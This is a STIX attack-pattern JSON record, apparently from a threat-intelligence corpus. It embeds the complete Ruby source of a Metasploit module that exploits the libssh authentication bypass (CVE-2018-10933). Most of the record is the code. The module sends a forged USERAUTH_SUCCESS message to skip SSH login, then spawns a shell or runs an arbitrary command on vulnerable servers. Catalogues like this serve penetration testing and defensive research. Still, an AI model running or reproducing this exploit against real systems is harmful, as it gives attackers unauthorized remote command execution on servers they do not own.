{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--997c5e52-6878-4923-ac49-80f7d2877d77",
    "created": "2024-08-14T16:27:29.885878Z",
    "modified": "2024-08-14T16:27:29.885882Z",
    "name": "libssh Authentication Bypass Scanner",
    "description": " This module exploits an authentication bypass in libssh server code where a USERAUTH_SUCCESS message is sent in place of the expected USERAUTH_REQUEST message. libssh versions 0.6.0 through 0.7.5 and 0.8.0 through 0.8.3 are vulnerable.  Note that this module's success depends on whether the server code can trigger the correct (shell/exec) callbacks despite only the state machine's authenticated state being set.  Therefore, you may or may not get a shell if the server requires additional code paths to be followed. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/ssh/libssh_auth_bypass.rb",
            "external_id": "libssh_auth_bypass.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-10933"
        },
        {
            "source_name": "reference",
            "url": "https://www.libssh.org/security/advisories/CVE-2018-10933.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n\n  include Msf::Exploit::Remote::SSH\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::CommandShell\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'libssh Authentication Bypass Scanner',\n      'Description'    => %q{\n        This module exploits an authentication bypass in libssh server code\n        where a USERAUTH_SUCCESS message is sent in place of the expected\n        USERAUTH_REQUEST message. libssh versions 0.6.0 through 0.7.5 and\n        0.8.0 through 0.8.3 are vulnerable.\n\n        Note that this module's success depends on whether the server code\n        can trigger the correct (shell/exec) callbacks despite only the state\n        machine's authenticated state being set.\n\n        Therefore, you may or may not get a shell if the server requires\n        additional code paths to be followed.\n      },\n      'Author'         => [\n        'Peter Winter-Smith', # Discovery\n        'wvu'                 # Module\n      ],\n      'References'     => [\n        ['CVE', '2018-10933'],\n        ['URL', 'https://www.libssh.org/security/advisories/CVE-2018-10933.txt']\n      ],\n      'DisclosureDate' => '2018-10-16',\n      'License'        => MSF_LICENSE,\n      'Actions'        => [\n        ['Shell',   'Description' => 'Spawn a shell'],\n        ['Execute', 'Description' => 'Execute a command']\n      ],\n      'DefaultAction'  => 'Shell'\n    ))\n\n    register_options([\n      Opt::RPORT(22),\n      OptString.new('CMD',        [false, 'Command or alternative shell']),\n      OptBool.new('SPAWN_PTY',    [false, 'Spawn a PTY', false]),\n      OptBool.new('CHECK_BANNER', [false, 'Check banner for libssh', true])\n    ])\n\n    register_advanced_options([\n      OptBool.new('SSH_DEBUG',  [false, 'SSH debugging', false]),\n      OptInt.new('SSH_TIMEOUT', [false, 'SSH timeout', 10])\n    ])\n  end\n\n  # Vulnerable since 0.6.0 and patched in 0.7.6 and 0.8.4\n  def check_banner(ip, version)\n    version =~ /libssh[_-]?([\\d.]*)$/ && $1 && (v = Rex::Version.new($1))\n\n    if v.nil?\n      vprint_error(\"#{ip}:#{rport} - #{version} does not appear to be libssh\")\n      Exploit::CheckCode::Unknown\n    elsif v.to_s.empty?\n      vprint_warning(\"#{ip}:#{rport} - libssh version not reported\")\n      Exploit::CheckCode::Detected\n    elsif v.between?(Rex::Version.new('0.6.0'), Rex::Version.new('0.7.5')) ||\n          v.between?(Rex::Version.new('0.8.0'), Rex::Version.new('0.8.3'))\n      vprint_good(\"#{ip}:#{rport} - #{version} appears to be unpatched\")\n      Exploit::CheckCode::Appears\n    else\n      vprint_error(\"#{ip}:#{rport} - #{version} appears to be patched\")\n      Exploit::CheckCode::Safe\n    end\n  end\n\n  def run_host(ip)\n    if action.name == 'Execute' && datastore['CMD'].blank?\n      fail_with(Failure::BadConfig, 'Execute action requires CMD to be set')\n    end\n\n    ssh_opts = ssh_client_defaults.merge({\n      port:            rport,\n      # The auth method is converted into a class name for instantiation,\n      # so libssh-auth-bypass here becomes LibsshAuthBypass from the mixin\n      auth_methods:    ['libssh-auth-bypass']\n    })\n\n    ssh_opts.merge!(verbose: :debug) if datastore['SSH_DEBUG']\n\n    print_status(\"#{ip}:#{rport} - Attempting authentication bypass\")\n\n    begin\n      ssh = Timeout.timeout(datastore['SSH_TIMEOUT']) do\n        Net::SSH.start(ip, username, ssh_opts)\n      end\n    rescue Net::SSH::Exception => e\n      vprint_error(\"#{ip}:#{rport} - #{e.class}: #{e.message}\")\n      return\n    end\n\n    return unless ssh\n\n    version = ssh.transport.server_version.version\n\n    # XXX: The OOB authentication leads to false positives, so check banner\n    if datastore['CHECK_BANNER']\n      return if check_banner(ip, version) !=\n        (Exploit::CheckCode::Appears || Exploit::CheckCode::Detected)\n    end\n\n    report_vuln(\n      host: ip,\n      name: self.name,\n      refs: self.references,\n      info: version\n    )\n\n    shell = Net::SSH::CommandStream.new(ssh, datastore['CMD'], pty: datastore['SPAWN_PTY'])\n\n    # XXX: Wait for CommandStream to log a channel request failure\n    sleep 0.1\n\n    if (e = shell.error)\n      print_error(\"#{ip}:#{rport} - #{e.class}: #{e.message}\")\n      return\n    end\n\n    print_status(\"Attempting #{action.name.inspect} Action, see \\\"show actions\\\" for more details\")\n    case action.name\n    when 'Shell'\n      if datastore['CreateSession']\n        start_session(self, \"#{self.name} (#{version})\", {}, false, shell.lsock)\n      end\n    when 'Execute'\n      output = shell.channel && (shell.channel[:data] || '').chomp\n\n      if output.blank?\n        print_error(\"#{ip}:#{rport} - Empty or blank command output\")\n        return\n      end\n\n      print_status(\"#{ip}:#{rport} - Executed: #{datastore['CMD']}\\n#{output}\")\n    end\n  end\n\n  def rport\n    datastore['RPORT']\n  end\n\n  def username\n    Rex::Text.rand_text_alphanumeric(8..42)\n  end\nend\n",
    "x_mitre_disclosure_date": "2018-10-16"
}